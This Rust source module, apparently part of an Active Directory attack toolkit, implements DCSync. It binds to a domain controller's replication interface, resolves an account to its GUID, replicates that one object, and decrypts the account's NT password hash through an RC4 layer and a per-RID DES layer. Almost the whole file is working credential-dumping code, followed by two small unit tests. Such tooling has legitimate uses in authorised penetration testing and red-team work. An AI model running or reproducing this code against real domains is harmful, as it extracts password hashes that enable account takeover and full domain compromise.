//! DRSUAPI (MS-DRSR) — the directory replication interface used for DCSync.
//!
//! DCSync abuses replication: bind to DRSUAPI over a sign+sealed ncacn_ip_tcp channel
//! (`DRSBind`), then request a single object's secrets with `DRSGetNCChanges`
//! (EXOP_REPL_OBJ). The reply carries the account's attributes with the secrets encrypted
//! under the NTLM session key; a per-RID DES pass then recovers the NT hash.
//!
//! This module marshals the DRS structures by hand on top of [`crate::ndr`]. `DRSBind` is
//! implemented and validated live; `DRSGetNCChanges` builds on the same primitives.

use crate::ndr::{NdrDecoder, NdrEncoder};
use crate::transport::RpcTcp;
use crate::{epm, Result, RpcError, Syntax};
use adhammer_core::Guid;

/// DRSUAPI interface: e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0.
pub fn drsuapi_syntax() -> Syntax {
    Syntax::new("e3514235-4b06-11d1-ab04-00c04fc2dcd2", 4, 0)
}

/// NTDSAPI client GUID (the well-known value every DRS client presents).
const NTDSAPI_CLIENT_GUID: &str = "e24d201a-4fd6-11d1-a3da-0000f875ae0d";

pub mod opnum {
    pub const DRS_BIND: u16 = 0;
    pub const DRS_GET_NC_CHANGES: u16 = 3;
    pub const DRS_CRACK_NAMES: u16 = 12;
}

// DS_NAME_FORMAT (MS-DRSR 4.1.4.1.3).
const DS_NT4_ACCOUNT_NAME: u32 = 2;
const DS_UNIQUE_ID_NAME: u32 = 6; // "{objectGUID}"

// DRS_EXTENSIONS_INT dwFlags bits we advertise — enough for a V8 request / V6 reply with
// strong (session-key) encryption of the returned secrets.
const DRS_EXT_BASE: u32 = 0x0000_0001;
const DRS_EXT_STRONG_ENCRYPTION: u32 = 0x0000_8000;
const DRS_EXT_GETCHGREQ_V8: u32 = 0x0100_0000;
const DRS_EXT_GETCHGREPLY_V6: u32 = 0x0400_0000;

/// Parse a "{guid}" (or bare guid) string into the 16-byte DCE wire layout.
fn parse_guid_braced(s: &str) -> Result<[u8; 16]> {
    let t = s.trim().trim_start_matches('{').trim_end_matches('}');
    Guid::parse(t).map(|g| g.0).ok_or_else(|| RpcError::Protocol(format!("bad GUID '{s}'")))
}

/// Build the DRS_EXTENSIONS_INT rgb payload (the bytes that follow `cb`).
fn drs_extensions_rgb() -> Vec<u8> {
    let mut v = Vec::new();
    let flags = DRS_EXT_BASE | DRS_EXT_STRONG_ENCRYPTION | DRS_EXT_GETCHGREQ_V8 | DRS_EXT_GETCHGREPLY_V6;
    v.extend_from_slice(&flags.to_le_bytes()); // dwFlags
    v.extend_from_slice(&[0u8; 16]); // SiteObjGuid
    v.extend_from_slice(&0u32.to_le_bytes()); // Pid
    v.extend_from_slice(&0u32.to_le_bytes()); // dwReplEpoch
    v.extend_from_slice(&0u32.to_le_bytes()); // dwFlagsExt
    v.extend_from_slice(&[0u8; 16]); // ConfigObjGUID
    v.extend_from_slice(&0xffff_ffffu32.to_le_bytes()); // dwExtCaps
    v
}

/// An established DRS session: the sealed RPC connection plus the server-returned handle.
pub struct DrsSession {
    rpc: RpcTcp,
    handle: [u8; 20],
    session_key: [u8; 16],
}

impl DrsSession {
    /// Resolve DRSUAPI's dynamic port via the endpoint mapper, open a sign+sealed session,
    /// and `DRSBind` to obtain the replication handle.
    pub async fn bind(
        host: &str,
        domain: &str,
        user: &str,
        password: &str,
    ) -> Result<Self> {
        let port = epm::resolve_port(host, drsuapi_syntax()).await?;
        let mut rpc = RpcTcp::connect(&format!("{host}:{port}")).await?;
        rpc.bind_sealed(drsuapi_syntax(), domain, user, password, "ADHAMMER").await?;

        // IDL_DRSBind(puuidClientDsa [unique], pextClient [unique]) → (ppextServer, phDrs, ret)
        let mut e = NdrEncoder::new();
        e.referent(); // puuidClientDsa: non-null unique pointer
        e.uuid(&Guid::parse(NTDSAPI_CLIENT_GUID).expect("client GUID").0);
        e.referent(); // pextClient: non-null unique pointer to DRS_EXTENSIONS
        let rgb = drs_extensions_rgb();
        let cb = rgb.len() as u32;
        e.u32(cb); // conformant max_count (rgb is [size_is(cb)])
        e.u32(cb); // cb
        e.bytes(&rgb);
        while e.len() % 4 != 0 {
            e.u8(0);
        }
        let resp = rpc.call_sealed(opnum::DRS_BIND, &e.into_bytes()).await?;

        // Reply: ppextServer [ref] → DRS_EXTENSIONS, phDrs (20-byte context handle), retval.
        let mut d = NdrDecoder::new(&resp);
        let _server_ext_ref = d.u32()?;
        let _max = d.u32()?;
        let server_cb = d.u32()? as usize;
        let _server_rgb = d.read_bytes(server_cb)?;
        while d.position() % 4 != 0 {
            d.u8()?;
        }
        let handle: [u8; 20] = d.read_bytes(20)?.try_into().unwrap();
        let retval = d.u32().unwrap_or(0);
        if retval != 0 {
            return Err(RpcError::Protocol(format!("DRSBind failed: 0x{retval:08x}")));
        }
        let session_key = rpc.session_key().ok_or_else(|| RpcError::Protocol("no session key".into()))?;
        Ok(DrsSession { rpc, handle, session_key })
    }

    pub fn handle(&self) -> &[u8; 20] {
        &self.handle
    }

    /// DRSCrackNames: resolve `DOMAIN\name` (NT4 format) to the target's objectGUID.
    /// Uses the V1 request/reply. Returns the 16-byte GUID (DCE wire layout).
    pub async fn crack_name_to_guid(&mut self, netbios_domain: &str, name: &str) -> Result<[u8; 16]> {
        let offered = format!("{netbios_domain}\\{name}");
        let mut e = NdrEncoder::new();
        e.bytes(&self.handle); // hDrs context handle (20 bytes, [ref])
        e.u32(1); // dwInVersion = 1
        // pmsgIn [ref, switch_is(1)] → non-encapsulated union: switch value then the V1 arm.
        e.u32(1); // union discriminant = 1
        e.u32(0); // CodePage
        e.u32(0); // LocaleId
        e.u32(0); // dwFlags
        e.u32(DS_NT4_ACCOUNT_NAME); // formatOffered
        e.u32(DS_UNIQUE_ID_NAME); // formatDesired
        e.u32(1); // cNames
        e.referent(); // rpNames (embedded pointer to the array)
        e.u32(1); // conformant max_count of the pointer array
        e.referent(); // rpNames[0] (pointer to the string)
        e.conformant_varying_wstr(&offered);
        let resp = self.rpc.call_sealed(opnum::DRS_CRACK_NAMES, &e.into_bytes()).await?;

        // Reply: pdwOutVersion (u32), then DRS_MSG_CRACKREPLY union (switch=1) → DS_NAME_RESULTW*
        //   { cItems, [ref] rItems* → [ cItems × { status u32, pDomain wstr*, pName wstr* } ] }
        let mut d = NdrDecoder::new(&resp);
        let _out_version = d.u32()?;
        let _union_switch = d.u32()?;
        let _presult_ref = d.u32()?; // pResult [ref] referent
        let c_items = d.u32()?;
        let _ritems_ref = d.u32()?; // rItems [ref] referent
        let _max = d.u32()?; // conformant max_count of the item array
        if c_items == 0 {
            return Err(RpcError::Protocol("CrackNames returned no items".into()));
        }
        // Item array: fixed fields first (status + two string referents), then the strings.
        let status = d.u32()?;
        let dom_ref = d.u32()?;
        let name_ref = d.u32()?;
        if status != 0 {
            return Err(RpcError::Protocol(format!("CrackNames status {status} (name not found?)")));
        }
        if dom_ref != 0 {
            let _dom = d.conformant_varying_wstr()?;
        }
        if name_ref == 0 {
            return Err(RpcError::Protocol("CrackNames: no cracked name returned".into()));
        }
        let cracked = d.conformant_varying_wstr()?; // "{guid}"
        parse_guid_braced(&cracked)
    }

    /// DRSGetNCChanges V8, single-object (EXOP_REPL_OBJ): replicate exactly the target
    /// object identified by `guid`. Returns the raw reply stub for attribute extraction.
    pub async fn get_nc_changes(&mut self, guid: &[u8; 16]) -> Result<Vec<u8>> {
        const EXOP_REPL_OBJ: u32 = 6;
        let mut e = NdrEncoder::new();
        e.bytes(&self.handle); // hDrs (20)
        e.u32(8); // dwInVersion
        e.u32(8); // union discriminant
        e.align(8); // the V8 arm has u64 members → 8-byte aligned after the discriminant

        // DRS_MSG_GETCHGREQ_V8 — fixed part (embedded pointer pointees are deferred).
        e.uuid(&[0u8; 16]); // uuidDsaObjDest
        e.uuid(&[0u8; 16]); // uuidInvocIdSrc
        e.referent(); // pNC (non-null)
        e.u64(0); // usnvecFrom.usnHighObjUpdate
        e.u64(0); // usnvecFrom.usnReserved
        e.u64(0); // usnvecFrom.usnHighPropUpdate
        e.null_ptr(); // pUpToDateVecDest
        e.u32(0); // ulFlags
        e.u32(1); // cMaxObjects
        e.u32(0); // cMaxBytes
        e.u32(EXOP_REPL_OBJ); // ulExtendedOp
        e.u64(0); // liFsmoInfo
        e.null_ptr(); // pPartialAttrSet
        e.null_ptr(); // pPartialAttrSetEx
        e.u32(0); // PrefixTableDest.PrefixCount
        e.null_ptr(); // PrefixTableDest.pPrefixEntry

        // Deferred: pNC pointee = DSNAME (conformant struct; StringName max_count first).
        e.u32(1); // StringName conformant max_count (NameLen + terminating null)
        e.u32(58); // structLen
        e.u32(0); // SidLen
        e.uuid(guid); // Guid (the target)
        e.bytes(&[0u8; 28]); // Sid
        e.u32(0); // NameLen
        e.u16(0); // StringName[0] = NUL
        while e.len() % 4 != 0 {
            e.u8(0);
        }

        let resp = self.rpc.call_sealed(opnum::DRS_GET_NC_CHANGES, &e.into_bytes()).await?;
        Ok(resp)
    }

    /// Full single-object DCSync: crack the name to a GUID, replicate the object, and decrypt
    /// its NT hash. Returns (rid, nt_hash).
    pub async fn dcsync(&mut self, netbios_domain: &str, name: &str) -> Result<(u32, [u8; 16])> {
        let guid = self.crack_name_to_guid(netbios_domain, name).await?;
        let reply = self.get_nc_changes(&guid).await?;
        let (rid, nt_enc) = parse_repl_object(&reply)?;
        if nt_enc.is_empty() {
            return Err(RpcError::Protocol("object has no unicodePwd (machine/empty?)".into()));
        }
        let nt = drs_decrypt_hash(&self.session_key, &nt_enc, rid)?;
        Ok((rid, nt))
    }
}

// DRS ATTRTYP for unicodePwd (the RC4/DES-wrapped NT hash).
const ATTR_UNICODE_PWD: u32 = 0x0009_005a;

/// Walk the DRS_MSG_GETCHGREPLY_V6 to the single replicated object; return (rid, encrypted
/// unicodePwd). Parses only as far as the unicodePwd attribute value.
fn parse_repl_object(reply: &[u8]) -> Result<(u32, Vec<u8>)> {
    let mut d = NdrDecoder::new(reply);
    // --- V6 fixed part ---
    d.u32()?; d.u32()?; // pdwOutVersion, union switch
    d.read_bytes(16)?; d.read_bytes(16)?; // uuidDsaObjSrc, uuidInvocIdSrc
    d.u32()?; // pNC ref
    d.align(8); d.read_bytes(24)?; d.read_bytes(24)?; // usnvecFrom, usnvecTo
    d.u32()?; // pUpToDateVecSrc ref
    let pfx_count = d.u32()?; d.u32()?; // PrefixTableSrc { count, ptr }
    d.u32()?; d.u32()?; d.u32()?; // ulExtendedRet, cNumObjects, cNumBytes
    d.u32()?; // pObjects ref
    d.u32()?; // fMoreData
    d.u32()?; d.u32()?; d.u32()?; d.u32()?; d.u32()?; // cNumNcSizeObjects/Values, cNumValues, rgValues, dwDRSError

    // --- deferred: pNC DSNAME ---
    skip_dsname(&mut d)?;
    // --- deferred: prefix table (count entries, then each OID's byte array) ---
    let ptmc = d.u32()?;
    let mut oid_lens = Vec::with_capacity(ptmc as usize);
    for _ in 0..ptmc {
        d.u32()?; // ndx
        oid_lens.push(d.u32()?); // OID length
        d.u32()?; // OID elements ptr
    }
    for l in oid_lens {
        if l > 0 {
            let m = d.u32()?;
            d.read_bytes(m as usize)?;
            d.align(4);
        }
    }
    let _ = pfx_count;

    // --- deferred: pObjects (REPLENTINFLIST) ---
    d.u32()?; // pNextEntInf ref
    d.u32()?; // ENTINF.pName ref
    d.u32()?; // ENTINF.ulFlags
    let attr_count = d.u32()?; // ATTRBLOCK.attrCount
    d.u32()?; // pAttr ref
    d.u32()?; // fIsNCPrefix
    d.u32()?; // pParentGuid ref
    d.u32()?; // pMetaDataExt ref

    // deferred within REPLENTINFLIST: pName DSNAME (carries the object SID → RID)
    let rid = read_dsname_rid(&mut d)?;

    // ATTR array (conformant): max_count then attr_count × (attrTyp, valCount, pAVal ref)
    let amc = d.u32()?;
    let mut triples = Vec::with_capacity(amc as usize);
    for _ in 0..amc {
        let at = d.u32()?;
        let vc = d.u32()?;
        let pav = d.u32()?;
        triples.push((at, vc, pav));
    }
    let _ = attr_count;

    // Per-attribute values (deferred, in attribute order). Stop once unicodePwd is captured.
    for (at, vc, pav) in triples {
        if pav == 0 || vc == 0 {
            continue;
        }
        let vmc = d.u32()?;
        let mut vptrs = Vec::with_capacity(vmc as usize);
        for _ in 0..vmc {
            d.u32()?; // valLen
            vptrs.push(d.u32()?); // pVal ref
        }
        let mut first = Vec::new();
        for (i, pv) in vptrs.iter().enumerate() {
            if *pv != 0 {
                let m = d.u32()?;
                let b = d.read_bytes(m as usize)?.to_vec();
                d.align(4);
                if i == 0 {
                    first = b;
                }
            }
        }
        if at == ATTR_UNICODE_PWD {
            return Ok((rid, first));
        }
    }
    Ok((rid, Vec::new()))
}

/// Consume a DSNAME (conformant struct); discard it.
fn skip_dsname(d: &mut NdrDecoder) -> Result<()> {
    let mc = d.u32()?; // StringName max_count
    d.u32()?; // structLen
    d.u32()?; // SidLen
    d.read_bytes(16)?; // Guid
    d.read_bytes(28)?; // Sid
    d.u32()?; // NameLen
    d.read_bytes(mc as usize * 2)?; // StringName
    d.align(4);
    Ok(())
}

/// Consume a DSNAME and return the RID from its embedded SID (last sub-authority).
fn read_dsname_rid(d: &mut NdrDecoder) -> Result<u32> {
    let mc = d.u32()?;
    d.u32()?; // structLen
    let sid_len = d.u32()?;
    d.read_bytes(16)?; // Guid
    let sid = d.read_bytes(28)?.to_vec();
    d.u32()?; // NameLen
    d.read_bytes(mc as usize * 2)?;
    d.align(4);
    if sid_len >= 8 {
        let count = sid[1] as usize;
        let off = 2 + 6 + (count - 1) * 4;
        return Ok(u32::from_le_bytes(sid[off..off + 4].try_into().unwrap()));
    }
    Err(RpcError::Protocol("object DSNAME has no SID".into()))
}

// -------------------------------------------------------------------------------------------
// DRS secret decryption (MS-DRSR 5.16.4): session-key MD5/RC4 unwrap, then per-RID DES.
// -------------------------------------------------------------------------------------------

fn drs_decrypt_hash(session_key: &[u8; 16], enc: &[u8], rid: u32) -> Result<[u8; 16]> {
    use md5::{Digest, Md5};
    if enc.len() < 20 {
        return Err(RpcError::Protocol("encrypted value too short".into()));
    }
    // Outer layer: RC4 keyed by MD5(sessionKey || salt); salt is the first 16 bytes.
    let salt = &enc[0..16];
    let mut md5 = Md5::new();
    md5.update(session_key);
    md5.update(salt);
    let rc4key = md5.finalize();
    let plain = adhammer_ntlm::Rc4::new(&rc4key).apply(&enc[16..]); // CRC32(4) + wrapped(16)
    if plain.len() < 20 {
        return Err(RpcError::Protocol("decrypted value too short".into()));
    }
    Ok(remove_des_layer(&plain[4..20], rid))
}

/// Undo the per-RID DES layer that wraps the stored NT hash.
fn remove_des_layer(data: &[u8], rid: u32) -> [u8; 16] {
    use des::cipher::generic_array::GenericArray;
    use des::cipher::{BlockDecrypt, KeyInit};
    use des::Des;
    let (k1, k2) = rid_to_des_keys(rid);
    let mut out = [0u8; 16];
    let c1 = Des::new(GenericArray::from_slice(&k1));
    let mut b0 = *GenericArray::from_slice(&data[0..8]);
    c1.decrypt_block(&mut b0);
    let c2 = Des::new(GenericArray::from_slice(&k2));
    let mut b1 = *GenericArray::from_slice(&data[8..16]);
    c2.decrypt_block(&mut b1);
    out[0..8].copy_from_slice(&b0);
    out[8..16].copy_from_slice(&b1);
    out
}

fn rid_to_des_keys(rid: u32) -> ([u8; 8], [u8; 8]) {
    let r = rid.to_le_bytes();
    let k1 = [r[0], r[1], r[2], r[3], r[0], r[1], r[2]];
    let k2 = [r[3], r[0], r[1], r[2], r[3], r[0], r[1]];
    (str_to_des_key(&k1), str_to_des_key(&k2))
}

/// Expand 7 key bytes into an 8-byte DES key (7 bits/byte, parity bit cleared).
fn str_to_des_key(s: &[u8; 7]) -> [u8; 8] {
    let mut k = [0u8; 8];
    k[0] = s[0] >> 1;
    k[1] = ((s[0] & 0x01) << 6) | (s[1] >> 2);
    k[2] = ((s[1] & 0x03) << 5) | (s[2] >> 3);
    k[3] = ((s[2] & 0x07) << 4) | (s[3] >> 4);
    k[4] = ((s[3] & 0x0f) << 3) | (s[4] >> 5);
    k[5] = ((s[4] & 0x1f) << 2) | (s[5] >> 6);
    k[6] = ((s[5] & 0x3f) << 1) | (s[6] >> 7);
    k[7] = s[6] & 0x7f;
    for b in k.iter_mut() {
        *b <<= 1;
    }
    k
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extensions_rgb_shape() {
        let rgb = drs_extensions_rgb();
        assert_eq!(rgb.len(), 52); // dwFlags+SiteObjGuid+Pid+ReplEpoch+FlagsExt+ConfigObjGUID+ExtCaps
        let flags = u32::from_le_bytes(rgb[0..4].try_into().unwrap());
        assert_eq!(flags & DRS_EXT_GETCHGREPLY_V6, DRS_EXT_GETCHGREPLY_V6);
        assert_eq!(flags & DRS_EXT_STRONG_ENCRYPTION, DRS_EXT_STRONG_ENCRYPTION);
    }

    #[test]
    fn syntax_uuid_parses() {
        let s = drsuapi_syntax();
        assert_eq!(s.ver_major, 4);
        assert_ne!(s.uuid, [0u8; 16]);
    }
}
